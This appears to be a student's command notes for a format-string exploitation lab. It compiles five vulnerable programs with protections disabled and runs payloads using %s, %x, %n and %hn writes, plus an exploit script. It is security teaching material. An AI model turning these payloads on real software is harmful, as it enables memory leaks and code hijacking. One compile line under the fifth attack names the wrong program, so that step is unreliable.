#ATTACK1
gedit attack1.c
gcc -no-pie -fno-stack-protector -z execstack -o attack1 attack1.c
./attack1 "%s%s%s%s%s%s%s%s"
#ATTACK2
gedit attack2.c
gcc -no-pie -fno-stack-protector -z execstack -o attack2 attack2.c
./attack2 "%x%x%x%x%x%x%x%x"
echo -n 64333034 | xxd -r -p | rev
#ATTACK3
gedit attack3.c
gcc -no-pie -fno-stack-protector -z execstack -o attack3 attack3.c
gdb ./attack3
(gdb) print &target
./attack3 "AAAAAAAA&n"
#ATTACK4
gedit attack4.c
gcc -no-pie -fno-stack-protector -z execstack -o attack4 attack4.c
./attack4 $(python3 -c "print('A'*26248 + '%1\$hn' + 'B'*4369 + '%2\$hn')")
#ATTACK5
gedit attack5.c
gcc -no-pie -fno-stack-protector -z execstack -o attack4 attack4.c
gedit exploit.py
python3 exploit.py
./attack5 "$(cat exploit)"
